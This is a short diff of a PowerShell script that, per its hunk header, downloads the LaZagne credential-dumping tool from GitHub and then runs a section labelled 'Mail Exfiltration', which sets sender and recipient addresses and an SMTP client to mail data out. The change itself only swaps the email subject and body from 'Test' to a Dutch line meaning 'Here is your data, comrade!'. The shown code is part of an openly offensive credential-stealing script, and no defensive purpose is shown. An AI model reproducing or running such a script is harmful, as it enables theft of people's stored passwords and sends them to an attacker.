@@ -101,8 +101,8 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 # Mail Exfiltration
 $EmailFrom = "HerbertSwindel@outlook.com"
 $EmailTo = "herbertswindel@gmail.com"
-$Subject = "Test"
-$Body = "Tricknology Test"
+$Subject = "Hier zijn uw gegevens kameraad!"
+$Body = "Hier zijn uw gegevens kameraad!"
 $SMTPServer = "smtp.outlook.com"
 
 $SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
